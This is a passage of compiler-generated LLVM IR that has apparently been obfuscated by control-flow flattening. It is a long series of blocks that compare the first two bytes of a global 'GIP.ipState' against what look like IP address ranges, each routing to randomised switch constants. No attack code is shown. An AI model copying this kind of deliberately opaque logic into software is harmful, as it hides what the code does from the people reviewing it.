  %675 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %676 = zext i8 %675 to i32
  %677 = icmp eq i32 %676, 134
  %678 = select i1 %677, i32 502685754, i32 -1007647702
  store i32 %678, i32* %switchVar
  br label %loopEnd

; <label>:679:                                    ; preds = %loopEntry
  %680 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %681 = zext i8 %680 to i32
  %682 = icmp sge i32 %681, 5
  %683 = select i1 %682, i32 -1576597338, i32 -1007647702
  store i32 %683, i32* %switchVar
  br label %loopEnd

; <label>:684:                                    ; preds = %loopEntry
  %685 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %686 = zext i8 %685 to i32
  %687 = icmp slt i32 %686, 235
  %688 = select i1 %687, i32 -886816699, i32 -1007647702
  store i32 %688, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:689:                                    ; preds = %loopEntry
  %690 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %691 = zext i8 %690 to i32
  %692 = icmp eq i32 %691, 136
  %693 = select i1 %692, i32 56501254, i32 -1494844227
  store i32 %693, i32* %switchVar
  br label %loopEnd

; <label>:694:                                    ; preds = %loopEntry
  %695 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %696 = zext i8 %695 to i32
  %697 = icmp sge i32 %696, 177
  %698 = select i1 %697, i32 -437352318, i32 -1494844227
  store i32 %698, i32* %switchVar
  br label %loopEnd

; <label>:699:                                    ; preds = %loopEntry
  %700 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %701 = zext i8 %700 to i32
  %702 = icmp slt i32 %701, 223
  %703 = select i1 %702, i32 -886816699, i32 -1494844227
  store i32 %703, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:704:                                    ; preds = %loopEntry
  %705 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %706 = zext i8 %705 to i32
  %707 = icmp eq i32 %706, 138
  %708 = select i1 %707, i32 802257231, i32 -1180340623
  store i32 %708, i32* %switchVar
  br label %loopEnd

; <label>:709:                                    ; preds = %loopEntry
  %710 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %711 = zext i8 %710 to i32
  %712 = icmp sge i32 %711, 13
  %713 = select i1 %712, i32 -997063949, i32 -1180340623
  store i32 %713, i32* %switchVar
  br label %loopEnd

; <label>:714:                                    ; preds = %loopEntry
  %715 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %716 = zext i8 %715 to i32
  %717 = icmp slt i32 %716, 194
  %718 = select i1 %717, i32 -886816699, i32 -1180340623
  store i32 %718, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:719:                                    ; preds = %loopEntry
  %720 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %721 = zext i8 %720 to i32
  %722 = icmp eq i32 %721, 139
  %723 = select i1 %722, i32 -1661544018, i32 -131163237
  store i32 %723, i32* %switchVar
  br label %loopEnd

; <label>:724:                                    ; preds = %loopEntry
  %725 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %726 = zext i8 %725 to i32
  %727 = icmp sge i32 %726, 31
  %728 = select i1 %727, i32 -616062532, i32 -131163237
  store i32 %728, i32* %switchVar
  br label %loopEnd

; <label>:729:                                    ; preds = %loopEntry
  %730 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %731 = zext i8 %730 to i32
  %732 = icmp slt i32 %731, 143
  %733 = select i1 %732, i32 -886816699, i32 -131163237
  store i32 %733, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:734:                                    ; preds = %loopEntry
  %735 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %736 = zext i8 %735 to i32
  %737 = icmp eq i32 %736, 140
  %738 = select i1 %737, i32 -1977882445, i32 772173178
  store i32 %738, i32* %switchVar
  br label %loopEnd

; <label>:739:                                    ; preds = %loopEntry
  %740 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %741 = zext i8 %740 to i32
  %742 = icmp sge i32 %741, 1
  %743 = select i1 %742, i32 -120721899, i32 772173178
  store i32 %743, i32* %switchVar
  br label %loopEnd

; <label>:744:                                    ; preds = %loopEntry
  %745 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %746 = zext i8 %745 to i32
  %747 = icmp slt i32 %746, 203
  %748 = select i1 %747, i32 -886816699, i32 772173178
  store i32 %748, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:749:                                    ; preds = %loopEntry
  %750 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %751 = zext i8 %750 to i32
  %752 = icmp eq i32 %751, 143
  %753 = select i1 %752, i32 1315573176, i32 -976533527
  store i32 %753, i32* %switchVar
  br label %loopEnd

; <label>:754:                                    ; preds = %loopEntry
  %755 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %756 = zext i8 %755 to i32
  %757 = icmp sge i32 %756, 45
  %758 = select i1 %757, i32 -512774789, i32 -976533527
  store i32 %758, i32* %switchVar
  br label %loopEnd

; <label>:759:                                    ; preds = %loopEntry
  %760 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %761 = zext i8 %760 to i32
  %762 = icmp slt i32 %761, 233
  %763 = select i1 %762, i32 -886816699, i32 -976533527
  store i32 %763, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:764:                                    ; preds = %loopEntry
  %765 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %766 = zext i8 %765 to i32
  %767 = icmp eq i32 %766, 144
  %768 = select i1 %767, i32 -396269382, i32 -1017344100
  store i32 %768, i32* %switchVar
  br label %loopEnd

; <label>:769:                                    ; preds = %loopEntry
  %770 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %771 = zext i8 %770 to i32
  %772 = icmp sge i32 %771, 99
  %773 = select i1 %772, i32 -1759077456, i32 -1017344100
  store i32 %773, i32* %switchVar
  br label %loopEnd

; <label>:774:                                    ; preds = %loopEntry
  %775 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %776 = zext i8 %775 to i32
  %777 = icmp slt i32 %776, 253
  %778 = select i1 %777, i32 -886816699, i32 -1017344100
  store i32 %778, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:779:                                    ; preds = %loopEntry
  %780 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %781 = zext i8 %780 to i32
  %782 = icmp eq i32 %781, 146
  %783 = select i1 %782, i32 -2012643135, i32 -1345101448
  store i32 %783, i32* %switchVar
  br label %loopEnd

; <label>:784:                                    ; preds = %loopEntry
  %785 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %786 = zext i8 %785 to i32
  %787 = icmp sge i32 %786, 165
  %788 = select i1 %787, i32 1146422912, i32 -1345101448
  store i32 %788, i32* %switchVar
  br label %loopEnd

; <label>:789:                                    ; preds = %loopEntry
  %790 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %791 = zext i8 %790 to i32
  %792 = icmp slt i32 %791, 166
  %793 = select i1 %792, i32 -886816699, i32 -1345101448
  store i32 %793, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:794:                                    ; preds = %loopEntry
  %795 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %796 = zext i8 %795 to i32
  %797 = icmp eq i32 %796, 147
  %798 = select i1 %797, i32 -1920151540, i32 -1922999310
  store i32 %798, i32* %switchVar
  br label %loopEnd

; <label>:799:                                    ; preds = %loopEntry
  %800 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %801 = zext i8 %800 to i32
  %802 = icmp sge i32 %801, 35
  %803 = select i1 %802, i32 -1019237649, i32 -1922999310
  store i32 %803, i32* %switchVar
  br label %loopEnd

; <label>:804:                                    ; preds = %loopEntry
  %805 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %806 = zext i8 %805 to i32
  %807 = icmp slt i32 %806, 43
  %808 = select i1 %807, i32 -886816699, i32 -1922999310
  store i32 %808, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:809:                                    ; preds = %loopEntry
  %810 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %811 = zext i8 %810 to i32
  %812 = icmp eq i32 %811, 147
  %813 = select i1 %812, i32 931495808, i32 247190400
  store i32 %813, i32* %switchVar
  br label %loopEnd

; <label>:814:                                    ; preds = %loopEntry
  %815 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %816 = zext i8 %815 to i32
  %817 = icmp sge i32 %816, 103
  %818 = select i1 %817, i32 1874919874, i32 247190400
  store i32 %818, i32* %switchVar
  br label %loopEnd

; <label>:819:                                    ; preds = %loopEntry
  %820 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %821 = zext i8 %820 to i32
  %822 = icmp slt i32 %821, 105
  %823 = select i1 %822, i32 -886816699, i32 247190400
  store i32 %823, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:824:                                    ; preds = %loopEntry
  %825 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %826 = zext i8 %825 to i32
  %827 = icmp eq i32 %826, 147
  %828 = select i1 %827, i32 221317019, i32 -2105337814
  store i32 %828, i32* %switchVar
  br label %loopEnd

; <label>:829:                                    ; preds = %loopEntry
  %830 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %831 = zext i8 %830 to i32
  %832 = icmp sge i32 %831, 168
  %833 = select i1 %832, i32 -1275305560, i32 -2105337814
  store i32 %833, i32* %switchVar
  br label %loopEnd

; <label>:834:                                    ; preds = %loopEntry
  %835 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %836 = zext i8 %835 to i32
  %837 = icmp slt i32 %836, 170
  %838 = select i1 %837, i32 -886816699, i32 -2105337814
  store i32 %838, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:839:                                    ; preds = %loopEntry
  %840 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %841 = zext i8 %840 to i32
  %842 = icmp eq i32 %841, 147
  %843 = select i1 %842, i32 -73677535, i32 -1127252625
  store i32 %843, i32* %switchVar
  br label %loopEnd

; <label>:844:                                    ; preds = %loopEntry
  %845 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %846 = zext i8 %845 to i32
  %847 = icmp sge i32 %846, 198
  %848 = select i1 %847, i32 1003905536, i32 -1127252625
  store i32 %848, i32* %switchVar
  br label %loopEnd

; <label>:849:                                    ; preds = %loopEntry
  %850 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %851 = zext i8 %850 to i32
  %852 = icmp slt i32 %851, 200
  %853 = select i1 %852, i32 -886816699, i32 -1127252625
  store i32 %853, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:854:                                    ; preds = %loopEntry
  %855 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %856 = zext i8 %855 to i32
  %857 = icmp eq i32 %856, 147
  %858 = select i1 %857, i32 -1776778679, i32 656329951
  store i32 %858, i32* %switchVar
  br label %loopEnd

; <label>:859:                                    ; preds = %loopEntry
  %860 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %861 = zext i8 %860 to i32
  %862 = icmp sge i32 %861, 238
  %863 = select i1 %862, i32 -534331498, i32 656329951
  store i32 %863, i32* %switchVar
  br label %loopEnd

; <label>:864:                                    ; preds = %loopEntry
  %865 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %866 = zext i8 %865 to i32
  %867 = icmp slt i32 %866, 255
  %868 = select i1 %867, i32 -886816699, i32 656329951
  store i32 %868, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:869:                                    ; preds = %loopEntry
  %870 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %871 = zext i8 %870 to i32
  %872 = icmp eq i32 %871, 150
  %873 = select i1 %872, i32 184637515, i32 1706108356
  store i32 %873, i32* %switchVar
  br label %loopEnd

; <label>:874:                                    ; preds = %loopEntry
  %875 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %876 = zext i8 %875 to i32
  %877 = icmp sge i32 %876, 113
  %878 = select i1 %877, i32 -2092549546, i32 1706108356
  store i32 %878, i32* %switchVar
  br label %loopEnd

; <label>:879:                                    ; preds = %loopEntry
  %880 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %881 = zext i8 %880 to i32
  %882 = icmp slt i32 %881, 115
  %883 = select i1 %882, i32 -886816699, i32 1706108356
  store i32 %883, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:884:                                    ; preds = %loopEntry
  %885 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %886 = zext i8 %885 to i32
  %887 = icmp eq i32 %886, 152
  %888 = select i1 %887, i32 1854569094, i32 502502159
  store i32 %888, i32* %switchVar
  br label %loopEnd

; <label>:889:                                    ; preds = %loopEntry
  %890 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %891 = zext i8 %890 to i32
  %892 = icmp sge i32 %891, 151
  %893 = select i1 %892, i32 -2008949446, i32 502502159
  store i32 %893, i32* %switchVar
  br label %loopEnd

; <label>:894:                                    ; preds = %loopEntry
  %895 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %896 = zext i8 %895 to i32
  %897 = icmp slt i32 %896, 155
  %898 = select i1 %897, i32 -886816699, i32 502502159
  store i32 %898, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:899:                                    ; preds = %loopEntry
  %900 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %901 = zext i8 %900 to i32
  %902 = icmp eq i32 %901, 153
  %903 = select i1 %902, i32 -628848893, i32 -753568895
  store i32 %903, i32* %switchVar
  br label %loopEnd

; <label>:904:                                    ; preds = %loopEntry
  %905 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %906 = zext i8 %905 to i32
  %907 = icmp sge i32 %906, 21
  %908 = select i1 %907, i32 74452708, i32 -753568895
  store i32 %908, i32* %switchVar
  br label %loopEnd

; <label>:909:                                    ; preds = %loopEntry
  %910 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %911 = zext i8 %910 to i32
  %912 = icmp slt i32 %911, 32
  %913 = select i1 %912, i32 -886816699, i32 -753568895
  store i32 %913, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:914:                                    ; preds = %loopEntry
  %915 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %916 = zext i8 %915 to i32
  %917 = icmp eq i32 %916, 155
  %918 = select i1 %917, i32 -1776728772, i32 2105997877
  store i32 %918, i32* %switchVar
  br label %loopEnd

; <label>:919:                                    ; preds = %loopEntry
  %920 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %921 = zext i8 %920 to i32
  %922 = icmp sge i32 %921, 5
  %923 = select i1 %922, i32 -653705668, i32 2105997877
  store i32 %923, i32* %switchVar
  br label %loopEnd

; <label>:924:                                    ; preds = %loopEntry
  %925 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %926 = zext i8 %925 to i32
  %927 = icmp slt i32 %926, 10
  %928 = select i1 %927, i32 -886816699, i32 2105997877
  store i32 %928, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:929:                                    ; preds = %loopEntry
  %930 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %931 = zext i8 %930 to i32
  %932 = icmp eq i32 %931, 155
  %933 = select i1 %932, i32 -1959505849, i32 539463553
  store i32 %933, i32* %switchVar
  br label %loopEnd

; <label>:934:                                    ; preds = %loopEntry
  %935 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %936 = zext i8 %935 to i32
  %937 = icmp sge i32 %936, 74
  %938 = select i1 %937, i32 -1452309320, i32 539463553
  store i32 %938, i32* %switchVar
  br label %loopEnd

; <label>:939:                                    ; preds = %loopEntry
  %940 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %941 = zext i8 %940 to i32
  %942 = icmp slt i32 %941, 89
  %943 = select i1 %942, i32 -886816699, i32 539463553
  store i32 %943, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:944:                                    ; preds = %loopEntry
  %945 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %946 = zext i8 %945 to i32
  %947 = icmp eq i32 %946, 155
  %948 = select i1 %947, i32 46509142, i32 -1495411028
  store i32 %948, i32* %switchVar
  br label %loopEnd

; <label>:949:                                    ; preds = %loopEntry
  %950 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %951 = zext i8 %950 to i32
  %952 = icmp sge i32 %951, 213
  %953 = select i1 %952, i32 738089890, i32 -1495411028
  store i32 %953, i32* %switchVar
  br label %loopEnd

; <label>:954:                                    ; preds = %loopEntry
  %955 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %956 = zext i8 %955 to i32
  %957 = icmp slt i32 %956, 222
  %958 = select i1 %957, i32 -886816699, i32 -1495411028
  store i32 %958, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:959:                                    ; preds = %loopEntry
  %960 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %961 = zext i8 %960 to i32
  %962 = icmp eq i32 %961, 157
  %963 = select i1 %962, i32 -284016517, i32 1739213025
  store i32 %963, i32* %switchVar
  br label %loopEnd

; <label>:964:                                    ; preds = %loopEntry
  %965 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %966 = zext i8 %965 to i32
  %967 = icmp sge i32 %966, 150
  %968 = select i1 %967, i32 -1296082312, i32 1739213025
  store i32 %968, i32* %switchVar
  br label %loopEnd

; <label>:969:                                    ; preds = %loopEntry
  %970 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %971 = zext i8 %970 to i32
  %972 = icmp slt i32 %971, 154
  %973 = select i1 %972, i32 -886816699, i32 1739213025
  store i32 %973, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:974:                                    ; preds = %loopEntry
  %975 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %976 = zext i8 %975 to i32
  %977 = icmp eq i32 %976, 158
  %978 = select i1 %977, i32 1860928241, i32 881342448
  store i32 %978, i32* %switchVar
  br label %loopEnd

; <label>:979:                                    ; preds = %loopEntry
  %980 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %981 = zext i8 %980 to i32
  %982 = icmp sge i32 %981, 1
  %983 = select i1 %982, i32 108579916, i32 881342448
  store i32 %983, i32* %switchVar
  br label %loopEnd

; <label>:984:                                    ; preds = %loopEntry
  %985 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %986 = zext i8 %985 to i32
  %987 = icmp slt i32 %986, 21
  %988 = select i1 %987, i32 -886816699, i32 881342448
  store i32 %988, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:989:                                    ; preds = %loopEntry
  %990 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %991 = zext i8 %990 to i32
  %992 = icmp eq i32 %991, 158
  %993 = select i1 %992, i32 114372406, i32 1913268845
  store i32 %993, i32* %switchVar
  br label %loopEnd

; <label>:994:                                    ; preds = %loopEntry
  %995 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %996 = zext i8 %995 to i32
  %997 = icmp sge i32 %996, 235
  %998 = select i1 %997, i32 -1388470799, i32 1913268845
  store i32 %998, i32* %switchVar
  br label %loopEnd

; <label>:999:                                    ; preds = %loopEntry
  %1000 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1001 = zext i8 %1000 to i32
  %1002 = icmp slt i32 %1001, 247
  %1003 = select i1 %1002, i32 -886816699, i32 1913268845
  store i32 %1003, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1004:                                   ; preds = %loopEntry
  %1005 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1006 = zext i8 %1005 to i32
  %1007 = icmp eq i32 %1006, 159
  %1008 = select i1 %1007, i32 759984039, i32 1814615750
  store i32 %1008, i32* %switchVar
  br label %loopEnd

; <label>:1009:                                   ; preds = %loopEntry
  %1010 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1011 = zext i8 %1010 to i32
  %1012 = icmp sge i32 %1011, 120
  %1013 = select i1 %1012, i32 -2052565400, i32 1814615750
  store i32 %1013, i32* %switchVar
  br label %loopEnd

; <label>:1014:                                   ; preds = %loopEntry
  %1015 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1016 = zext i8 %1015 to i32
  %1017 = icmp slt i32 %1016, 121
  %1018 = select i1 %1017, i32 -886816699, i32 1814615750
  store i32 %1018, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1019:                                   ; preds = %loopEntry
  %1020 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1021 = zext i8 %1020 to i32
  %1022 = icmp eq i32 %1021, 160
  %1023 = select i1 %1022, i32 -4709455, i32 1412313664
  store i32 %1023, i32* %switchVar
  br label %loopEnd

; <label>:1024:                                   ; preds = %loopEntry
  %1025 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1026 = zext i8 %1025 to i32
  %1027 = icmp sge i32 %1026, 132
  %1028 = select i1 %1027, i32 -1776513339, i32 1412313664
  store i32 %1028, i32* %switchVar
  br label %loopEnd

; <label>:1029:                                   ; preds = %loopEntry
  %1030 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1031 = zext i8 %1030 to i32
  %1032 = icmp slt i32 %1031, 151
  %1033 = select i1 %1032, i32 -886816699, i32 1412313664
  store i32 %1033, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1034:                                   ; preds = %loopEntry
  %1035 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1036 = zext i8 %1035 to i32
  %1037 = icmp eq i32 %1036, 64
  %1038 = select i1 %1037, i32 -147126302, i32 1701365911
  store i32 %1038, i32* %switchVar
  br label %loopEnd

; <label>:1039:                                   ; preds = %loopEntry
  %1040 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1041 = zext i8 %1040 to i32
  %1042 = icmp sge i32 %1041, 224
  %1043 = select i1 %1042, i32 -287659605, i32 1701365911
  store i32 %1043, i32* %switchVar
  br label %loopEnd

; <label>:1044:                                   ; preds = %loopEntry
  %1045 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1046 = zext i8 %1045 to i32
  %1047 = icmp slt i32 %1046, 227
  %1048 = select i1 %1047, i32 -886816699, i32 1701365911
  store i32 %1048, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1049:                                   ; preds = %loopEntry
  %1050 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1051 = zext i8 %1050 to i32
  %1052 = icmp eq i32 %1051, 162
  %1053 = select i1 %1052, i32 1319521650, i32 -1122909727
  store i32 %1053, i32* %switchVar
  br label %loopEnd

; <label>:1054:                                   ; preds = %loopEntry
  %1055 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1056 = zext i8 %1055 to i32
  %1057 = icmp sge i32 %1056, 45
  %1058 = select i1 %1057, i32 -1976421011, i32 -1122909727
  store i32 %1058, i32* %switchVar
  br label %loopEnd

; <label>:1059:                                   ; preds = %loopEntry
  %1060 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1061 = zext i8 %1060 to i32
  %1062 = icmp slt i32 %1061, 47
  %1063 = select i1 %1062, i32 -886816699, i32 -1122909727
  store i32 %1063, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1064:                                   ; preds = %loopEntry
  %1065 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1066 = zext i8 %1065 to i32
  %1067 = icmp eq i32 %1066, 163
  %1068 = select i1 %1067, i32 -1411223462, i32 628309816
  store i32 %1068, i32* %switchVar
  br label %loopEnd

; <label>:1069:                                   ; preds = %loopEntry
  %1070 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1071 = zext i8 %1070 to i32
  %1072 = icmp sge i32 %1071, 205
  %1073 = select i1 %1072, i32 -983323951, i32 628309816
  store i32 %1073, i32* %switchVar
  br label %loopEnd

; <label>:1074:                                   ; preds = %loopEntry
  %1075 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1076 = zext i8 %1075 to i32
  %1077 = icmp slt i32 %1076, 207
  %1078 = select i1 %1077, i32 -886816699, i32 628309816
  store i32 %1078, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1079:                                   ; preds = %loopEntry
  %1080 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1081 = zext i8 %1080 to i32
  %1082 = icmp eq i32 %1081, 164
  %1083 = select i1 %1082, i32 883600631, i32 -1251895845
  store i32 %1083, i32* %switchVar
  br label %loopEnd

; <label>:1084:                                   ; preds = %loopEntry
  %1085 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1086 = zext i8 %1085 to i32
  %1087 = icmp sge i32 %1086, 45
  %1088 = select i1 %1087, i32 -533777114, i32 -1251895845
  store i32 %1088, i32* %switchVar
